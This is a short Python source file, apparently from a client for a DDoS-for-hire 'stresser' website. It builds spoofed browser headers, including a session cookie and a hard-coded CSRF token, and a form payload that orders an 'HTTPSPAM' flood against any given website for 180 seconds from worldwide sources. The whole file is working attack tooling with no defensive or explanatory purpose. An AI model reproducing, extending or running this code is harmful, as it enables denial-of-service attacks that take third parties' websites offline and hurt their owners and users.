class get:
    def attack_headers(cookie: str, user_agent) -> dict:
        return {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://stresser.su',
        'referer': 'https://stresser.su/hub',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'cookie': cookie,
        'user-agent': user_agent,
        'x-csrf-token': '2c54c2a7540b77593e7df717a79b395cdlgut6slb845stsjv9cud4fuje1451refCS2a02c7c5ca780004c2fb342eacc5e3frefCS82ec23e3a9510a780b6b72f9460922f2',
        'x-requested-with': 'XMLHttpRequest' }
        
    def attack_payload(website_url: str) -> dict: 
        return {
        'startAttack': '1',
        'preset-name-7': '',
        'start-date': '',
        'start-time': '',
        'host[]': website_url,
        'time': '180',
        'slots': '1',
        'origin': 'Worldwide',
        'method': 'HTTPSPAM' }